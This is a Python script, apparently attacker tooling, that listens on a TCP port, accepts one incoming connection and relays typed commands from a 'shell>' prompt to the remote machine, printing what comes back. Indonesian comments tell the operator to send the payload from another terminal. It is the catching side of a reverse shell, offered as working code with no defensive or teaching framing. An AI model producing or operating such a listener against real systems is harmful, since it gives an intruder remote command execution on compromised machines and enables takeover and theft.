import socket
import subprocess
import os
import sys

def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 9999
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port))
    s.listen(1)
    print(f'[+] Listening on 0.0.0.0:{port}...')
    print('[!] JANGAN akses port ini lewat browser!')
    print('[!] Gunakan terminal lain untuk kirim payload.')
    conn, addr = s.accept()
    print(f'[+] Connection from {addr}')
    
    while True:
        try:
            cmd = input('shell> ')
            if not cmd:
                continue
            conn.send(cmd.encode() + b'\n')
            output = conn.recv(4096).decode()
            print(output)
        except (BrokenPipeError, ConnectionResetError):
            print('[-] Connection lost')
            break
        except KeyboardInterrupt:
            print('[!] Exiting...')
            break

if __name__ == '__main__':
    main()
